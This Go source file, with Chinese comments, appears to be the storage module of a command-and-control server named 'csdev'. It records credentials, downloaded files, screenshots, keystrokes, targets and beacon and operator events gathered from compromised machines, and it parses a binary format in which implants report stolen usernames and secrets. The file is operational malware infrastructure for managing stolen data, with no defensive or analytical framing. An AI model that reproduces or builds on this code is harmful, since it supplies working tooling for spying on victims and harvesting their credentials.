// csdev :: store.go  --  凭据 / 下载 / 截屏 / 键盘记录 / 事件日志 存储
//
// 内存索引 + JSONL 追加落盘 (data/store.jsonl), 重启后可回放。
package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"time"
)

var (
	downloadDir   = "downloads"
	screenshotDir = "screenshots"
	dataDir       = "data"
	storeFile     = filepath.Join("data", "store.jsonl")
)

// ---------------------------------------------------------------- 记录类型

type Credential struct {
	Kind   RecordKind `json:"kind"`
	ID     uint64     `json:"id"`
	SID    string     `json:"sid"`
	CredK  uint8      `json:"cred_kind"`
	User   string     `json:"user"`
	Secret string     `json:"secret"`
	Source string     `json:"source"`
	TS     int64      `json:"ts"`
}

type Download struct {
	Kind       RecordKind `json:"kind"`
	ID         uint64     `json:"id"`
	SID        string     `json:"sid"`
	Name       string     `json:"name"`
	Path       string     `json:"path"`
	RemotePath string     `json:"remote_path"`
	Size       int64      `json:"size"`
	TS         int64      `json:"ts"`
}

type Screenshot struct {
	Kind RecordKind `json:"kind"`
	ID   uint64     `json:"id"`
	SID  string     `json:"sid"`
	Path string     `json:"path"`
	Size int64      `json:"size"`
	TS   int64      `json:"ts"`
}

type Keystroke struct {
	Kind   RecordKind `json:"kind"`
	ID     uint64     `json:"id"`
	SID    string     `json:"sid"`
	Text   string     `json:"text"`
	Source string     `json:"source"`
	TS     int64      `json:"ts"`
}

type Event struct {
	Kind   RecordKind `json:"kind"`
	ID     uint64     `json:"id"`
	Cat    string     `json:"cat"` // beacon / operator / listener / system
	SID    string     `json:"sid"`
	Action string     `json:"action"`
	Detail string     `json:"detail"`
	Who    string     `json:"who"`
	TS     int64      `json:"ts"`
}

type RecordKind string

const (
	KindCredential RecordKind = "credential"
	KindDownload   RecordKind = "download"
	KindScreenshot RecordKind = "screenshot"
	KindKeystroke  RecordKind = "keystroke"
	KindEvent      RecordKind = "event"
	KindTarget     RecordKind = "target"
)

// ---------------------------------------------------------------- 存储

type Store struct {
	mu          sync.RWMutex
	creds       []Credential
	downloads   []Download
	screenshots []Screenshot
	keylogs     []Keystroke
	events      []Event
	targets     []Target
	seq         map[string]uint64
}

var stStore = &Store{seq: map[string]uint64{}}

func nextStoreID(prefix string) uint64 {
	stStore.mu.Lock()
	defer stStore.mu.Unlock()
	stStore.seq[prefix]++
	return stStore.seq[prefix]
}

// 统一入库: 按类型分发 + 落盘
func storeAdd(v interface{}) {
	stStore.mu.Lock()
	switch r := v.(type) {
	case Credential:
		stStore.creds = append(stStore.creds, r)
	case Download:
		stStore.downloads = append(stStore.downloads, r)
	case Screenshot:
		stStore.screenshots = append(stStore.screenshots, r)
	case Keystroke:
		stStore.keylogs = append(stStore.keylogs, r)
	case Event:
		stStore.events = append(stStore.events, r)
	case Target:
		stStore.targets = append(stStore.targets, r)
	}
	stStore.mu.Unlock()

	storePersist(v)
}

// storePersist 只做落盘, 不修改内存切片 (用于更新已有条目后的持久化)。
// 回放时同一 ID 的后写记录会覆盖先前的。
func storePersist(v interface{}) {
	if err := os.MkdirAll(dataDir, 0o755); err != nil {
		return
	}
	f, err := os.OpenFile(storeFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	defer f.Close()
	if b, err := json.Marshal(v); err == nil {
		f.Write(append(b, '\n'))
	}
}

func eventLog(cat, sid, action, detail string) {
	storeAdd(Event{
		Kind:   KindEvent,
		ID:     nextStoreID("ev"),
		Cat:    cat,
		SID:    sid,
		Action: action,
		Detail: detail,
		TS:     time.Now().Unix(),
	})
}

// 回放已落盘记录
func storeLoad() {
	b, err := os.ReadFile(storeFile)
	if err != nil {
		return
	}
	for _, line := range splitLines(b) {
		if len(line) == 0 {
			continue
		}
		var probe struct {
			Kind RecordKind `json:"kind"`
		}
		if json.Unmarshal(line, &probe) != nil {
			continue
		}
		switch probe.Kind {
		case KindCredential:
			var v Credential
			if json.Unmarshal(line, &v) == nil {
				stStore.creds = append(stStore.creds, v)
				bumpSeq("cr", v.ID)
			}
		case KindDownload:
			var v Download
			if json.Unmarshal(line, &v) == nil {
				stStore.downloads = append(stStore.downloads, v)
				bumpSeq("dl", v.ID)
			}
		case KindScreenshot:
			var v Screenshot
			if json.Unmarshal(line, &v) == nil {
				stStore.screenshots = append(stStore.screenshots, v)
				bumpSeq("ss", v.ID)
			}
		case KindKeystroke:
			var v Keystroke
			if json.Unmarshal(line, &v) == nil {
				stStore.keylogs = append(stStore.keylogs, v)
				bumpSeq("kl", v.ID)
			}
		case KindEvent:
			var v Event
			if json.Unmarshal(line, &v) == nil {
				stStore.events = append(stStore.events, v)
				bumpSeq("ev", v.ID)
			}
		case KindTarget:
			var v Target
			if json.Unmarshal(line, &v) == nil {
				// 同 ID 覆盖: targetUpsert 更新后会再追加一条
				replaced := false
				for i := range stStore.targets {
					if stStore.targets[i].ID == v.ID {
						stStore.targets[i] = v
						replaced = true
						break
					}
				}
				if !replaced {
					stStore.targets = append(stStore.targets, v)
				}
				bumpSeq("tg", v.ID)
			}
		}
	}
}

func bumpSeq(prefix string, id uint64) {
	if id > stStore.seq[prefix] {
		stStore.seq[prefix] = id
	}
}

func splitLines(b []byte) [][]byte {
	out := [][]byte{}
	start := 0
	for i := 0; i < len(b); i++ {
		if b[i] == '\n' {
			line := b[start:i]
			if len(line) > 0 && line[len(line)-1] == '\r' {
				line = line[:len(line)-1]
			}
			out = append(out, line)
			start = i + 1
		}
	}
	if start < len(b) {
		out = append(out, b[start:])
	}
	return out
}

// ---------------------------------------------------------------- 解码

// TLV 0x1008: [1B kind][2B user_len][user][2B secret_len][secret][2B source_len][source]
func parseCredentialTLV(d []byte) (Credential, error) {
	var c Credential
	if len(d) < 1+2 {
		return c, fmt.Errorf("凭据 TLV 过短")
	}
	c.Kind = KindCredential
	c.ID = nextStoreID("cr")
	c.CredK = d[0]

	get := func(off int) (string, int, error) {
		if off+2 > len(d) {
			return "", off, fmt.Errorf("截断")
		}
		n := int(binary.BigEndian.Uint16(d[off : off+2]))
		off += 2
		if off+n > len(d) {
			return "", off, fmt.Errorf("截断")
		}
		s := string(d[off : off+n])
		return s, off + n, nil
	}

	var err error
	off := 1
	if c.User, off, err = get(off); err != nil {
		return c, err
	}
	if c.Secret, off, err = get(off); err != nil {
		return c, err
	}
	if c.Source, _, err = get(off); err != nil {
		return c, err
	}
	return c, nil
}

// ---------------------------------------------------------------- 查询

func storeCreds() []Credential {
	stStore.mu.RLock()
	defer stStore.mu.RUnlock()
	out := make([]Credential, len(stStore.creds))
	copy(out, stStore.creds)
	return out
}

func storeDownloads() []Download {
	stStore.mu.RLock()
	defer stStore.mu.RUnlock()
	out := make([]Download, len(stStore.downloads))
	copy(out, stStore.downloads)
	return out
}

func storeScreenshots() []Screenshot {
	stStore.mu.RLock()
	defer stStore.mu.RUnlock()
	out := make([]Screenshot, len(stStore.screenshots))
	copy(out, stStore.screenshots)
	return out
}

func storeKeylogs() []Keystroke {
	stStore.mu.RLock()
	defer stStore.mu.RUnlock()
	out := make([]Keystroke, len(stStore.keylogs))
	copy(out, stStore.keylogs)
	return out
}

func storeEvents(limit int) []Event {
	stStore.mu.RLock()
	defer stStore.mu.RUnlock()
	out := make([]Event, 0, limit)
	n := len(stStore.events)
	start := 0
	if limit > 0 && n > limit {
		start = n - limit
	}
	for i := n - 1; i >= start; i-- {
		out = append(out, stStore.events[i])
	}
	return out
}

// ---------------------------------------------------------------- 清空

func storePrune() {
	stStore.mu.Lock()
	defer stStore.mu.Unlock()
	if len(stStore.events) > 20000 {
		stStore.events = stStore.events[len(stStore.events)-10000:]
	}
	if len(stStore.keylogs) > 5000 {
		stStore.keylogs = stStore.keylogs[len(stStore.keylogs)-2500:]
	}
}

// ---------------------------------------------------------------- 删除/清空 (带持久化)

// removeByID 从切片中按 ID 删除一个元素 (所有记录类型都有 ID 字段)。
func removeByID[T any](slice []T, getID func(T) uint64, target uint64) ([]T, bool) {
	for i := range slice {
		if getID(slice[i]) == target {
			return append(slice[:i], slice[i+1:]...), true
		}
	}
	return slice, false
}

// storeRewriteLocked 全量重写落盘文件, 用于删除/清空后持久化 (否则重启后删除项会复活)。
// 调用方需持有 stStore.mu 写锁。
func storeRewriteLocked() {
	var all []interface{}
	for _, c := range stStore.creds {
		all = append(all, c)
	}
	for _, d := range stStore.downloads {
		all = append(all, d)
	}
	for _, s := range stStore.screenshots {
		all = append(all, s)
	}
	for _, k := range stStore.keylogs {
		all = append(all, k)
	}
	for _, e := range stStore.events {
		all = append(all, e)
	}
	for _, t := range stStore.targets {
		all = append(all, t)
	}

	if err := os.MkdirAll(dataDir, 0o755); err != nil {
		return
	}
	f, err := os.Create(storeFile)
	if err != nil {
		return
	}
	defer f.Close()
	for _, v := range all {
		if b, err := json.Marshal(v); err == nil {
			f.Write(append(b, '\n'))
		}
	}
}

// storeDeleteRecord 按类型 + ID 删除一条记录并持久化。
func storeDeleteRecord(kind RecordKind, id uint64) bool {
	stStore.mu.Lock()
	defer stStore.mu.Unlock()

	var removed bool
	switch kind {
	case KindCredential:
		stStore.creds, removed = removeByID(stStore.creds, func(c Credential) uint64 { return c.ID }, id)
	case KindDownload:
		stStore.downloads, removed = removeByID(stStore.downloads, func(d Download) uint64 { return d.ID }, id)
	case KindScreenshot:
		stStore.screenshots, removed = removeByID(stStore.screenshots, func(s Screenshot) uint64 { return s.ID }, id)
	case KindKeystroke:
		stStore.keylogs, removed = removeByID(stStore.keylogs, func(k Keystroke) uint64 { return k.ID }, id)
	case KindEvent:
		stStore.events, removed = removeByID(stStore.events, func(e Event) uint64 { return e.ID }, id)
	case KindTarget:
		stStore.targets, removed = removeByID(stStore.targets, func(t Target) uint64 { return t.ID }, id)
	}
	if !removed {
		return false
	}
	storeRewriteLocked()
	return true
}

// storeClear 清空某类记录并持久化。
func storeClear(kind RecordKind) {
	stStore.mu.Lock()
	defer stStore.mu.Unlock()
	switch kind {
	case KindCredential:
		stStore.creds = nil
	case KindDownload:
		stStore.downloads = nil
	case KindScreenshot:
		stStore.screenshots = nil
	case KindKeystroke:
		stStore.keylogs = nil
	case KindEvent:
		stStore.events = nil
	}
	storeRewriteLocked()
}

// storeFindPath 按类型 + ID 查找记录的 Path (download/screenshot 用, 删除前先删落盘文件)。
func storeFindPath(kind RecordKind, id uint64) string {
	stStore.mu.RLock()
	defer stStore.mu.RUnlock()
	switch kind {
	case KindDownload:
		for _, d := range stStore.downloads {
			if d.ID == id {
				return d.Path
			}
		}
	case KindScreenshot:
		for _, s := range stStore.screenshots {
			if s.ID == id {
				return s.Path
			}
		}
	}
	return ""
}
